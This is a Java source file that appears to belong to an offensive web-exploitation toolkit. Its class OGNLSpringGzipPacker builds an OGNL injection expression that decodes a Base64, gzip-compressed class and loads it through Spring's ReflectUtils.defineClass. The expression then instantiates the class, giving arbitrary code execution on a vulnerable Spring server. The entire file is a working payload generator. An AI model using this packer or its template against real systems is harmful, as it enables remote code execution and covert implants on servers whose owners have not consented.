package com.reajason.javaweb.packer.ognl;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Packers;
import lombok.SneakyThrows;

/**
 * @author ReaJason
 * @since 2025/7/7
 */
public class OGNLSpringGzipPacker implements Packer {
    String template = "(@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.StreamUtils@copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader()))).newInstance()";

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        return template.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", Packers.GzipBase64.getInstance().pack(config));
    }
}
